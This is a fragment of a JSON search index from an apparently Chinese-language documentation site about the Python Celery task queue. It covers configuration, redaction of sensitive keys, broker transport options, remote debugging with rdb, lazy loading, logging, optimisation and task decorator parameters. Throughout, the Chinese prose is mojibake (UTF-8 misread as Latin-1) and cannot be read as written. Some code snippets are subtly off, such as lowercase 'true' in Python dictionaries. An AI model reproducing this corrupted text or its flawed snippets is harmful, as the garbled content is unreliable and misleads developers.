ç„¶åé€šè¿‡æŒ‡å®šçš„ç¯å¢ƒå˜é‡è¿›è¡Œé…ç½®ä½¿ç”¨çš„é…ç½®æ¨¡å—ï¼š $ CELERY_CONFIG_MODULE=\"celeryconfig.prod\" celery worker -l info task_routesæ¶‰åŠåˆ°è‡ªå®šä¹‰é˜Ÿåˆ—å¤„ç†ä»»åŠ¡, è¯¦æƒ…è§: å®˜ç½‘ä¸­æ–‡ç¿»è¯‘æ–‡æ¡£-è·¯ç”± éƒ¨åˆ†è¯´æ˜è§: è·¯ç”± é…ç½®çš„è·å–/è¿‡æ»¤ å°†é…ç½®ä½œä¸ºè°ƒè¯•ä¿¡æ¯æˆ–ç±»ä¼¼ä¿¡æ¯æ‰“å°å‡ºæ¥ï¼Œé‚£ä¹ˆæ‚¨ä¹Ÿå¯èƒ½å¸Œæœ›è¿‡æ»¤æ‰æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å¯†ç å’ŒAPIå¯†é’¥ã€‚ Celery æä¾›äº†é›†ä¸­æ‰“å°é…ç½®ä¿¡æ¯å·¥å…·ï¼Œå…¶ä¸­ä¸€ä¸ªä¸º humanize(): >>> app.conf.humanize(with_defaults=False, censored=True) è¯¥æ–¹æ³•å°†é…ç½®ä¿¡æ¯è½¬æ¢ä¸ºåˆ—è¡¨å­—ç¬¦ä¸²è¿”å›ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œä»…åŒ…å«ä¿®æ”¹çš„é”®å€¼ï¼Œå¯ä»¥é€šè¿‡ with_defaults å‚æ•°è¿›è¡ŒåŒ…å«é»˜è®¤çš„é…ç½®ä¿¡æ¯ã€‚ å¯ä»¥é€šè¿‡ table() æ–¹æ³•å°†è¿”å›ç»“æœè½¬æ¢ä¸ºå­—å…¸: >>> app.conf.table(with_defaults=False, censored=True) æ³¨æ„ï¼šCelery ä¸ä¼šåˆ é™¤æ‰€æœ‰çš„æ•æ„Ÿé…ç½®ä¿¡æ¯ï¼Œé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼æ¥è¿›è¡Œæ£€ç´¢é€šå¸¸å‘½åçš„ä¿¡æ¯ï¼Œ å¦‚æœåŒ…å«æ•æ„Ÿä¿¡æ¯çš„è‡ªå®šä¹‰é…ç½®ï¼ŒCelery ä¼šæ ‡è¯†ä¸ºæœºå¯†çš„åç§°æ¥ä¸‹è¿›è¡Œå‘½åç§˜é’¥ã€‚ å¦‚æœå‘½åä¸­å«æœ‰å­å­—ç¬¦ä¸²ï¼Œå°†ä¼šè¿›è¡Œè¿‡æ»¤: APIã€TOKENã€KEYã€SECRETã€PASSã€SIGNATUREã€DATABASE æ³¨æ„äº‹é¡¹ å¹¿æ’­å‰ç¼€ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„è™šæ‹Ÿæœºéƒ½å¯ä»¥çœ‹åˆ°å¹¿æ’­çš„æ¶ˆæ¯ã€‚ æ‚¨å¿…é¡»ä¸ºæ¶ˆæ¯è¿›è¡Œè®¾ç½®å‰ç¼€ï¼Œä»¥ä¾¿å®ƒä»¬ç”±ä»…æ´»åŠ¨çš„è™šæ‹Ÿæœºæ¥æ”¶: app.conf.broker_transport_options = {'fanout_prefix': true} æ³¨æ„ï¼šè¯¥é€‰é¡¹ä»…æ˜¯å‘åå…¼å®¹çš„ï¼Œè€ç‰ˆæœ¬ä¸æ”¯æŒã€‚é›†ç¾¤ä¸­æ‰€æœ‰çš„èŒç¨‹éƒ½å¿…é¡»è¦å¼€å¯è®¾ç½®ï¼Œå¦åˆ™æ— æ³•è¿›è¡Œé€šä¿¡ã€‚ è¯¥è®¾ç½®åœ¨å°†æ¥ä»¥åçš„ç‰ˆæœ¬æ˜¯é»˜è®¤é…ç½®ï¼Œæ‰€ä»¥è¯·å°½æ—©è¿›è¡Œè¿ç§»ã€‚ å¹¿æ’­æ¨¡å¼ é»˜è®¤æƒ…å†µä¸‹ï¼Œ èŒç¨‹ï¼ˆWorkerï¼‰æ”¶åˆ°æ‰€æœ‰ä¸ä»»åŠ¡ç›¸å…³çš„äº‹ä»¶ã€‚ ä¸ºäº†é¿å…è¯¥æƒ…å†µå‘ç”Ÿï¼Œéœ€è¦è¿›è¡Œé…ç½® fanout_patterns å¹¿æ’­æ¨¡å¼ï¼Œä»¥ä¾¿èŒç¨‹ï¼ˆWorkerï¼‰åªèƒ½è®¢é˜…ç›¸å…³çš„äº‹ä»¶: app.conf.broker_transport_options = {'fanout_patterns': true} è¯¥è®¾ç½®åœ¨å°†æ¥ä»¥åçš„ç‰ˆæœ¬æ˜¯é»˜è®¤é…ç½®ã€‚ å¯è§æ€§è¶…æ—¶-æ³¨æ„ å¦‚æœåœ¨ å¯è§æ€§è¶…æ—¶ å†…æ²¡æœ‰å®Œæˆä»»åŠ¡ï¼Œè¯¥ä»»åŠ¡ä¼šé‡æ–°åˆ†é…ç»™å¦å¤–ä¸€ä¸ªèŒç¨‹ï¼ˆWorkerï¼‰è¿›è¡Œæ‰§è¡Œã€‚ è¿™å¯èƒ½ä¼šå‡ºç°åœ¨é¢„è®¡æ—¶é—´è¶…å‡ºå¯è§æ€§è¶…æ—¶æ—¶é—´çš„é—®é¢˜ï¼Œå¦‚æœå‡ºç°è¯¥é—®é¢˜ï¼Œä»»åŠ¡å°†é‡æ–°å¾ªç¯æ‰§è¡Œã€‚ å› æ­¤æ‚¨å¿…é¡»è¦å¢åŠ å¯è§æ€§è¶…æ—¶æ—¶é—´ç”¨äºç”¨äºåŒ¹é…æœ€é•¿çš„æ‰§è¡Œæ—¶é—´ã€‚ æ³¨æ„ï¼šCeleryä¼šåœ¨èŒç¨‹ï¼ˆWorkerï¼‰å…³é—­çš„é‡æ–°åˆ†é…æ¶ˆæ¯ï¼Œå¦‚æœå¯è§æ€§è¶…æ—¶æ—¶é—´è¿‡é•¿åœ¨æ–­ç”µæˆ–è€…å¼ºåˆ¶ç»ˆæ­¢èŒç¨‹ï¼ˆWorkerï¼‰çš„æƒ…å†µä¼š\"ä¸¢å¤±\"é‡æ–°åˆ†é…çš„ä»»åŠ¡ã€‚ å®šæœŸæ‰§è¡Œä»»åŠ¡ä¸ä¼šè¢«å¯è§æ€§è¶…æ—¶å½±å“ï¼Œå› ä¸ºè¿™æ˜¯ä¿©ä¸ªä¸åŒçš„æ¦‚å¿µã€‚ æ‚¨å¯ä»¥é€šè¿‡é…ç½®åŒåçš„é…ç½®é€‰é¡¹æ¥æ‰©å¢å¯è§æ€§è¶…æ—¶æ—¶é—´: app.conf.broker_transport_options = {'visibility_timeout': 432000} å¯¹åº”çš„å€¼å¿…é¡»ä¸º int ç±»å‹ã€‚ é©±é€Key åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒRedisä¼šæ ¹æ®ï¼ˆé©±é€ç­–ç•¥ï¼‰è¿›è¡Œé©±é€ä¸€äº›key å¯èƒ½ä¼šå‡ºç°å·²ç»é”™è¯¯é—®é¢˜: InconsistencyError: Probably the key ('_kombu.binding.celery') has been removed from the Redis database. æ‚¨å¯ä»¥åœ¨RedisæœåŠ¡å™¨çš„ time_out å‚æ•°è®¾ç½®ä¸º0è¿›è¡Œé¿å…keyè¢«é©±é€ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-conf_celery.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-conf_celery.html"},{"title":"è¿œç¨‹è°ƒè¯•ä»»åŠ¡ (ä½¿ç”¨ pdb)","text":"åŸºæœ¬ç”¨æ³• celery.contrib.rdb æ˜¯ pdb çš„ä¸€ä¸ªæ‰©å±•ç‰ˆæœ¬ï¼Œå¯ä»¥å¯¹æ²¡æœ‰ç»ˆç«¯è®¿é—®æƒé™çš„è¿›ç¨‹è¿›è¡Œè¿œç¨‹è°ƒè¯•ã€‚ ä½¿ç”¨ç¤ºä¾‹: from celery import task from celery.contrib import rdb @task() def add(x, y): result = x + y rdb.set_trace() # <- set break-point return result set_trace() åœ¨å½“å‰ä½ç½®è®¾ç½®äº†ä¸€ä¸ªæ–­ç‚¹ï¼Œå¹¶åˆ›å»ºäº†ä¸€ä¸ªå¯ä»¥é€šè¿‡ telnet è¿æ¥çš„ç®¡é“ç”¨ä»¥è°ƒè¯•ä½ çš„ä»»åŠ¡ã€‚ è°ƒè¯•å™¨å¯èƒ½åŒæ—¶ç”±å¤šä¸ªè¿›ç¨‹å¯åŠ¨ï¼Œæ‰€ä»¥è°ƒè¯•å™¨å°†ä»åŸºç¡€ç«¯å£(é»˜è®¤æƒ…å†µä¸‹ä¸º6900)å¼€å§‹æœç´¢å¯ç”¨çš„ç«¯å£ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ä¸€ä¸ªå›ºå®šçš„ç«¯å£ã€‚ åŸºç¡€ç«¯å£å¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡ CELERY_RDB_PORT æ¥è¿›è¡Œä¿®æ”¹ã€‚ é»˜è®¤æƒ…å†µä¸‹è°ƒè¯•å™¨å°†åªå¯¹æœ¬æœºå¯ç”¨ï¼Œä½ å¯ä»¥é€šè¿‡ CELERY_RDB_HOST æ¥è®¾ç½®å…è®¸ä»å¤–ç•Œè®¿é—®è°ƒè¯•å™¨ã€‚ å½“èŒç¨‹æ‰§è¡Œåˆ°ä½ æŒ‡å®šçš„æ–­ç‚¹å¤„æ—¶ï¼Œå°†ä¼šæ‰“å°å¦‚ä¸‹æ—¥å¿—ä¿¡æ¯: [INFO/MainProcess] Received task: tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8] [WARNING/PoolWorker-1] Remote Debugger:6900: Please telnet 127.0.0.1 6900. Type `exit` in session to continue. [2011-01-18 14:25:44,119: WARNING/PoolWorker-1] Remote Debugger:6900: Waiting for client... å¦‚æœä½ ä½¿ç”¨ telnet è¿æ¥äº†æŒ‡å®šçš„ç«¯å£ï¼Œå°†ä¼šæ˜¾ç¤ºä¸€ä¸ª pdb çš„ shell: $ telnet localhost 6900 Connected to localhost. Escape character is '&#94;]'. > /opt/devel/demoapp/tasks.py(128)add() -> return result (Pdb) è¾“å…¥ help å¯ä»¥è·å–å¯ç”¨çš„å‘½ä»¤åˆ—è¡¨ï¼Œå¦‚æœæ‚¨ä¹‹å‰å¹¶æ²¡æœ‰ç”¨è¿‡ pdb ï¼Œæœ€å¥½å…ˆé˜…è¯»ä¸€ä¸‹æ–‡æ¡£ Python Debugger Manual ã€‚ ä¸ºäº†æ¼”ç¤ºï¼Œæˆ‘ä»¬å°†è¯»å– result å˜é‡çš„å€¼ï¼Œå¯¹å…¶è¿›è¡Œä¿®æ”¹ä¹‹åç»§ç»­æ‰§è¡Œä»»åŠ¡: (Pdb) result 4 (Pdb) result = 'hello from rdb' (Pdb) continue Connection closed by foreign host. æˆ‘ä»¬ä¿®æ”¹çš„ç»“æœå°†åœ¨èŒç¨‹çš„æ—¥å¿—å‘ˆç°: [2011-01-18 14:35:36,599: INFO/MainProcess] Task tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8] succeeded in 61.481s: 'hello from rdb' æç¤º å¯ç”¨æ–­ç‚¹ä¿¡å· å¦‚æœè®¾ç½®äº†ç¯å¢ƒå˜é‡ CELERY_RDBSIG ï¼Œæ¯å½“æ”¶åˆ° SIGUSR2 ä¿¡å·æ—¶ï¼Œå°±ä¼šæ‰“å¼€ä¸€ä¸ª rdb çš„å®ä¾‹ã€‚ä¸»è¿›ç¨‹å’Œå·¥ä½œè¿›ç¨‹éƒ½æ˜¯è¿™ç§æƒ…å†µã€‚ å¯åŠ¨èŒç¨‹çš„ç¤ºä¾‹: $ CELERY_RDBSIG=1 celery worker -l info ä½ å¯ä»¥é€šè¿‡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ä¸ºä»»ä½•å·¥ä½œèŒç¨‹å¯åŠ¨ä¸€ä¸ª rdb çš„ä¼šè¯: $ kill -USR2 <pid>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-debug.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-debug.html"},{"title":"celeryåŠ è½½æµç¨‹ä¸æ‡’åŠ è½½","text":"ç¨‹åºæ˜¯æ‡’åŠ è½½çš„ï¼Œåœ¨æ²¡æœ‰å®é™…ä½¿ç”¨çš„æƒ…å†µä¸‹ï¼Œæ˜¯ä¸ä¼šè¿›è¡ŒåŠ è½½çš„ã€‚ åˆ›å»ºä¸€ä¸ª Celery ç¨‹åºçš„æµç¨‹å¦‚ä¸‹: åˆ›å»ºç”¨äºäº‹ä»¶çš„é€»è¾‘æ—¶é’Ÿå®ä¾‹ åˆ›å»ºä»»åŠ¡æ³¨å†Œè¡¨ å°†è‡ªèº«è®¾ç½®ä¸ºå½“å‰åº”ç”¨ç¨‹åºï¼ˆå¦‚æœç¦ç”¨ set_as_current å‚æ•°åˆ™ä¸ä¼šï¼‰ è°ƒç”¨ app.on_init() å›è°ƒå‡½æ•°(é»˜è®¤æƒ…å†µä¸‹ä¸æ‰§è¡Œä»»ä½•æ“ä½œ) app.task() è£…é¥°å™¨ä¸ä¼šåœ¨å®šä¹‰ä»»åŠ¡æ—¶åˆ›å»ºä»»åŠ¡ï¼Œåˆ›å»ºä»»åŠ¡é€šå¸¸åœ¨ä½¿ç”¨è¯¥ä»»åŠ¡æˆ–åº”ç”¨ç¨‹åºå®Œæˆåè¿›è¡Œåˆ›å»ºã€‚ ä¸¾ä¾‹è¯´æ˜ï¼Œåœ¨ä½¿ç”¨ä»»åŠ¡æˆ–è®¿é—®å±æ€§ä¹‹å‰ï¼Œæ˜¯å¦‚ä½•åˆ›å»ºä»»åŠ¡çš„: >>> @app.task >>> def add(x, y): ... return x + y >>> type(add) <class 'celery.local.PromiseProxy'> >>> add.__evaluated__() False >>> add # <-- causes repr(add) to happen <@task: __main__.add> >>> add.__evaluated__() True åº”ç”¨ç¨‹åºçš„ç»ˆç»“å¯ä»¥é€šè¿‡è°ƒç”¨ app.finalize() æ˜¾å¼æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥é€šè¿‡è®¿é—® app.tasks å±æ€§éšå¼æ‰§è¡Œã€‚ å®Œæˆåˆ›å»ºå¯¹è±¡å°†: å¤åˆ¶å¿…é¡»åœ¨åº”ç”¨ä¹‹é—´å…±äº«çš„ä»»åŠ¡ é»˜è®¤æƒ…å†µä¸‹å…±äº«ä»»åŠ¡ï¼Œå¦‚æœè®¾ç½®è£…é¥°å™¨çš„ shared å‚æ•°ï¼Œè¯¥ä»»åŠ¡ä¸ºç§æœ‰ä»»åŠ¡ã€‚ è¯„ä¼°æ‰€æœ‰å¾…å¤„ç†çš„ä»»åŠ¡è£…é¥°å™¨ ç¡®ä¿å½“å‰æ‰€æœ‰çš„äººå‘¢æˆ‘éƒ½å·²ç»ç»‘å®šåˆ°å½“å‰åº”ç”¨ç¨‹åº ä»»åŠ¡ç»‘å¸¦åˆ°åº”ç”¨ç¨‹åºï¼Œä¾¿äºä»é…ç½®ä¸­è·å–é…ç½®ä¿¡æ¯ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-load_celery.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-load_celery.html"},{"title":"æ—¥å¿—","text":"celery æä¾›äº†è‡ªå¸¦çš„æ—¥å¿—æœºåˆ¶ get_task_logger: from celery.utils.log import get_task_logger logger = get_task_logger(__name__) @app.task def add(x, y): logger.info('Adding {0} + {1}'.format(x, y)) return x + y","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-logging.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-logging.html"},{"title":"ä¼˜åŒ–","text":"é»˜è®¤æƒ…å†µä¸‹ï¼Œé»˜è®¤çš„é…ç½®é¡¹æ²¡æœ‰é’ˆå¯¹ååé‡è¿›è¡Œä¼˜åŒ–ï¼Œé»˜è®¤çš„é…ç½®æ¯”è¾ƒåˆé€‚å¤§é‡çŸ­ä»»åŠ¡å’Œæ¯”è¾ƒå°‘çš„é•¿ä»»åŠ¡ã€‚ å¦‚æœéœ€è¦ä¼˜åŒ–ååé‡ï¼Œè¯·å‚è€ƒä¼˜åŒ–ï¼šOptimizingã€‚ ä¸­é—´äºº å¦‚æœä½¿ç”¨çš„ä¸­é—´äººæ˜¯ RabbitMQï¼Œå¯ä»¥å°†æ¢æˆ librabbitmq æ¨¡å—ï¼ˆé€šè¿‡ C è¯­è¨€å®ç°çš„AMQPå®¢æˆ·ç«¯ï¼‰: $ pip install librabbitmq ä»»åŠ¡æ‰§è¡Œ é¿å…å¯åŠ¨åŒæ­¥å­ä»»åŠ¡ è®©ä¸€ä¸ªä»»åŠ¡ç­‰å¾…å¦ä¸€ä¸ªä»»åŠ¡çš„ç»“æœå¾€å¾€æ˜¯éå¸¸ä½æ•ˆçš„ï¼Œå¹¶åœ¨å·¥ä½œæ± è€—å°½æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ­»é”ã€‚ å»ºè®®ä½¿æ‚¨çš„è®¾è®¡å¼‚æ­¥åŒ–ï¼Œä¾‹å¦‚ä½¿ç”¨å›è°ƒå‡½æ•°ã€‚ ä¾‹å­: # ç³Ÿç³•çš„ä½¿ç”¨ @app.task def update_page_info(url): page = fetch_page.delay(url).get() info = parse_page.delay(url, page).get() store_page_info.delay(url, info) # è¾ƒå¥½çš„ä½¿ç”¨ def update_page_info(url): # fetch_page -> parse_page -> store_page chain = fetch_page.s(url) | parse_page.s() | store_page_info.s(url) chain() @app.task() def fetch_page(url): return myhttplib.get(url) @app.task() def parse_page(page): return myparser.parse_document(page) @app.task(ignore_result=True) def store_page_info(info, url): PageInfo.objects.create(url=url, info=info) é»˜è®¤æƒ…å†µä¸‹ï¼ŒCeleryä¸å…è®¸æ‚¨åœ¨ä»»åŠ¡ä¸­è¿è¡ŒåŒæ­¥å­ä»»åŠ¡ï¼Œä½†æ˜¯åœ¨æå°‘æ•°æˆ–æç«¯æƒ…å†µä¸‹æ‚¨å¯èƒ½éœ€è¦è¿™ä¹ˆåšã€‚ è­¦å‘Š å¼ºçƒˆä¸å»ºè®®åœ¨ä»»åŠ¡ä¸­è¿è¡ŒåŒæ­¥å­ä»»åŠ¡ã€‚ ä»»åŠ¡ä¸­å¼ºåˆ¶è¿è¡ŒåŒæ­¥å­ä»»åŠ¡ @app.task def update_page_info(url): page = fetch_page.delay(url).get(disable_sync_subtasks=False) info = parse_page.delay(url, page).get(disable_sync_subtasks=False) store_page_info.delay(url, info)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-optimization.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-optimization.html"},{"title":"å¯é€‰å®‰è£…å·¥å…·","text":"å®‰è£…: pip install celery[librabbitmq,redis,auth,msgpack] ä¸­æ‹¬å·ä¸­è¡¨ç¤ºå¯é€‰æ‹“å±•, éƒ¨åˆ†æ‹“å±•è¯´æ˜: librabbitmq ä½¿ç”¨ librabbitmq çš„ C åº“ redis ä½¿ç”¨ Redis ä½œä¸ºæ¶ˆæ¯ä¼ è¾“æ–¹å¼æˆ–ç»“æœåç«¯ mongodb ä½¿ç”¨ MongoDB ä½œä¸ºæ¶ˆæ¯ä¼ è¾“æ–¹å¼ï¼ˆ å®éªŒæ€§ ï¼‰ï¼Œæˆ–æ˜¯ç»“æœåç«¯ï¼ˆ å·²æ”¯æŒ ï¼‰ã€‚ auth åºåˆ—åŒ–å·¥å…· msgpack åºåˆ—åŒ–å·¥å…· yaml åºåˆ—åŒ–å·¥å…· eventlet ä½¿ç”¨ eventlet æ±  gevent ä½¿ç”¨ gevent æ±  threads ä½¿ç”¨ çº¿ç¨‹ æ± ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-option_install.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-option_install.html"},{"title":"ä¸€äº›é—®é¢˜/æŠ¥é”™","text":"Module xxx has no attribute â€˜celeryâ€˜ æŠ¥é”™å¤§æ¦‚éƒ½æ˜¯è¿™æ ·: Module xxx has no attribute â€˜celeryâ€˜ celery å¯¹ç›®å½•æ¨¡å—å•¥çš„è¦æ±‚æ¯”è¾ƒä¸¥æ ¼, å¯åŠ¨çš„æ—¶å€™, -A/--app çš„å‚æ•°, éœ€è¦æ˜ç¡®æŒ‡å®šå…·ä½“çš„å®ä¾‹åŒ– Celery çš„ py æ–‡ä»¶ å¦‚ app.py: # coding: utf-8 from celery import Celery app = Celery() æ‰€åœ¨ä½ç½®å¦‚ä¸‹: % tree src/time_schedule/app.py src/time_schedule/app.py [error opening dir] 0 directories, 0 files å¯åŠ¨: celery -A time_schedule.app --workdir src worker -l info ä½¿ç”¨ time_schedule.app è€Œä¸æ˜¯ time_schedule è¯´æ˜: celery é»˜è®¤åªå¯»æ‰¾ æŒ‡å®šæ¨¡å—ä¸‹çš„ celery.py , é™¤éæ›´å app.py ä¸º celery.py å¦åˆ™å¿…é¡»æŒ‡å®šå…·ä½“çš„ å®ä¾‹åŒ– Celery çš„ py æ–‡ä»¶","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-some-problems.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-some-problems.html"},{"title":"Celeryçš„Task","text":"å‚è€ƒ:: [Celery ä¸­æ–‡æ‰‹å†Œ] ä»»åŠ¡: Tasks æ¦‚å¿µä¸ å¼‚æ­¥ çš„ä»»åŠ¡ç±»ä¼¼ åŸºç¡€ ä½¿ç”¨ task() è£…é¥°å™¨è½»æ¾çš„åˆ›å»ºä»»ä½•å¯è¢«è°ƒç”¨çš„ä»»åŠ¡: from .models import User @app.task def create_user(username, password): User.objects.create(username=username, password=password) æ”¯æŒæŒ‡å®šå‚æ•°: @app.task(serializer='json') def create_user(username, password): User.objects.create(username=username, password=password) æ³¨æ„, è‹¥å­˜åœ¨å¤šä¸ªè£…é¥°å™¨, app.task éœ€è¦æ”¾åœ¨é¦–ä½. è¿˜æœ‰ä¸€ä¸ª app.shared_task å¾…... ä¸€äº›å±æ€§/æ–¹æ³• app.taskè£…é¥°å™¨æ”¯æŒçš„å‚æ•° name: ä»»åŠ¡æ³¨å†Œçš„åç§°ã€‚ å¯ä»¥æ‰‹åŠ¨è®¾ç½®ä»»åŠ¡åç§°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ¨¡å—åå’Œç±»åè¿›è¡Œè‡ªåŠ¨ç”Ÿæˆ(é»˜è®¤è¡Œä¸º)ã€‚ backend: ç»“æœåç«¯çš„å®ä¾‹ï¼Œç”¨äºä»»åŠ¡ç»“æœåç«¯ï¼Œé»˜è®¤ä¸º app.backendï¼Œå¯ä»¥é€šè¿‡ result_backend è¿›è¡Œé…ç½®ã€‚ acks_late: å¦‚æœè®¾ç½®ä¸º Trueï¼Œä»»åŠ¡æ‰§è¡Œåï¼ˆè€Œä¸æ˜¯æ‰§è¡Œå‰ï¼Œé»˜è®¤ä¸ºæ‰§è¡Œå‰ï¼‰æ‰ä¼šç¡®è®¤è¯¥ä»»åŠ¡çš„æ¶ˆæ¯ã€‚ æ³¨æ„ï¼šå¦‚æœèŒç¨‹ï¼ˆWorkerï¼‰æ‰§è¡Œè¿‡ç¨‹ä¸­å´©æºƒï¼Œä»»åŠ¡å¯èƒ½ä¼šæ‰§è¡Œå¤šæ¬¡ã€‚ å¯ä»¥é€šè¿‡ task_acks_late å‚æ•°æ¥è¿›è¡Œå…¨å±€é…ç½®ã€‚ track_started: å¦‚æœè®¾ç½®ä¸º Trueï¼Œå½“èŒç¨‹ï¼ˆWorkerï¼‰æ‰§è¡Œä»»åŠ¡æ—¶ï¼Œä»»åŠ¡çŠ¶æ€ä¸º staredã€‚ é»˜è®¤ä¸º Falseï¼Œå› ä¸ºåœ¨æ­£å¸¸æƒ…å†µä¸‹æ˜¯ä¸éœ€è¦è¯¥é¢—ç²’åº¦çº§åˆ«çš„ã€‚ ä»»åŠ¡è¦ä¹ˆæŒ‚èµ·ã€å®Œæˆè¦ä¹ˆç­‰å¾…é‡è¯•ã€‚ å¦‚æœæœ‰é•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡ï¼Œå¹¶ä¸”éœ€è¦æŠ¥å‘Šä»»å½“ä»»åŠ¡çŠ¶æ€æ—¶ï¼Œstaredæ¯”è¾ƒæœ‰ç”¨ã€‚ ä»»åŠ¡æ‰§è¡Œçš„èŒç¨‹ï¼ˆWorkerï¼‰å’Œè¿›ç¨‹ id å¯ä»¥é€šè¿‡çŠ¶æ€çš„å…ƒæ•°æ®ä¸­è¿›è¡ŒæŸ¥çœ‹ï¼ˆä¾‹å¦‚ï¼šresult.info['pid']ï¼‰ã€‚ å¯ä»¥é€šè¿‡ task_track_started è¿›è¡Œå…¨å±€é…ç½®ã€‚ rate_limit: Union[int, float, None] é…ç½®ä»»åŠ¡çš„é¢‘ç‡. é™åˆ¶æŒ‡å®šä»»åŠ¡ç±»å‹çš„é€Ÿç‡ï¼ˆé™åˆ¶åœ¨æŒ‡å®šæ—¶é—´å†…è¿è¡Œçš„ä»»åŠ¡æ•°é‡ï¼‰ã€‚å½“é€Ÿç‡é™åˆ¶ç”Ÿæ•ˆæ—¶ï¼Œä»»åŠ¡ä»ç„¶ä¼šå®Œæˆï¼Œä½†æ˜¯å¯èƒ½éœ€è¦ä¸€äº›æ—¶é—´æ‰èƒ½å¼€å§‹ã€‚ å¦‚æœé™åˆ¶é€Ÿç‡ä¸º Noneï¼Œè¡¨ç¤ºé€Ÿç‡é™åˆ¶æ— æ•ˆ. é€Ÿç‡å¯ä»¥ä¸º int ä¹Ÿå¯ä»¥ä¸º float ç±»å‹ï¼Œåˆ™è¢«è¡¨ç¤ºä¸º\"æ¯ç§’ä»»åŠ¡æ•°\"ã€‚ bind: bool=False ä¸º Trur æ—¶è¡¨ç¤ºè®¾ç½®ç¬¬ä¸€ä¸ªå‚æ•°ä¸º self (taskå®ä¾‹) serializer: str è®¾ç½®åºåˆ—åŒ–æ–¹å¼, ä¼šè¦†ç›–æ‰åˆå§‹é…ç½®. é»˜è®¤ä¸º task_serializerï¼Œ ä¹Ÿå¯ä»¥ä¸º pickleã€jsonã€yaml æˆ–è€…é€šè¿‡ kombu.serialization.registry æ³¨å†Œçš„è‡ªå®šä¹‰åºåˆ—åŒ–æ–¹æ³•ã€‚ request: å¦‚æœè¯¥ä»»åŠ¡æ­£å¤„äºæ‰§è¡ŒçŠ¶æ€ï¼Œè¯¥ä¿¡æ¯åŒ…å«è¯¥ä»»åŠ¡çš„è¯·æ±‚ä¿¡æ¯ã€‚ä½¿ç”¨å¤šçº¿ç¨‹æœ¬åœ°å­˜å‚¨ã€‚ è§: request throws: tuple é¢„æœŸå†…çš„å¼‚å¸¸ï¼Œå¦‚æœåœ¨å…ƒç»„ä¸­å«æœ‰è¯¥å¼‚å¸¸ç±»ï¼Œå°†ä¸ä¼šè¢«è§†ä¸ºå¼‚å¸¸ã€‚ ä½†æ˜¯æ—¥å¿—ä¼šè®°å½•åˆ°ç»“æœåç«¯. time_limit: è¯¥ä»»åŠ¡çš„ç¡¬æ—¶é—´é™åˆ¶ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®èŒç¨‹ï¼ˆWorkerï¼‰æ—¶ï¼Œä½¿ç”¨é»˜è®¤å€¼ã€‚ soft_time_limit: è¯¥ä»»åŠ¡çš„è½¯æ—¶é—´é™åˆ¶ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®èŒç¨‹ï¼ˆWorkerï¼‰æ—¶ï¼Œä½¿ç”¨é»˜è®¤å€¼ã€‚ ignore_result: ä¸å­˜å‚¨ä»»åŠ¡çŠ¶æ€ä¿¡æ¯ï¼Œå¦‚æœé…ç½®è¯¥é€‰é¡¹ AsyncResult å°†å¤±æ•ˆï¼Œæ— æ³•è¿›è¡Œæ£€æµ‹ä»»åŠ¡æƒ…å†µä»¥åŠè¿”å›å†…å®¹ã€‚ å¦‚æœä½ å¹¶ä¸å…³å¿ƒä»»åŠ¡çš„ç»“æœï¼Œè¯·åŠ¡å¿…ç¡®å®šè®¾ç½® ignore_result é€‰é¡¹ï¼Œå› ä¸ºå­˜å‚¨ç»“æœä¼šæµªè´¹æ—¶é—´å’Œèµ„æºã€‚ store_errors_even_if_ignored: å¦‚æœè®¾ç½®ä¸º True ï¼Œå³ä½¿ä»»åŠ¡è¢«å¿½ç•¥ï¼Œä¹Ÿä¼šå­˜å‚¨é”™è¯¯ä¿¡æ¯ã€‚ compression: æ ‡è¯†éœ€è¦ä½¿ç”¨é»˜è®¤å‹ç¼©æ–¹æ³•çš„å­—ç¬¦ä¸²ã€‚ é»˜è®¤ä¸º task_compressionï¼Œå¯ä»¥è®¾ç½®ä¸º gzipã€bzip2æˆ–é€šè¿‡ kombu.compression æ³¨å†Œçš„è‡ªå®šä¹‰å‹ç¼©æ–¹æ¡ˆã€‚ max_retries: int = 3 å½“å‰ä»»åŠ¡è°ƒç”¨ self æˆ–ä½¿ç”¨ autoretry_for å‚æ•°æ—¶æ‰ä¼šå¯ç”¨ã€‚ å¦‚æœé‡è¯•çš„æ¬¡æ•°è¶…è¿‡æœ€å¤§é™åˆ¶ï¼Œä¼šå¼•å‘ MaxRetriesExceededError 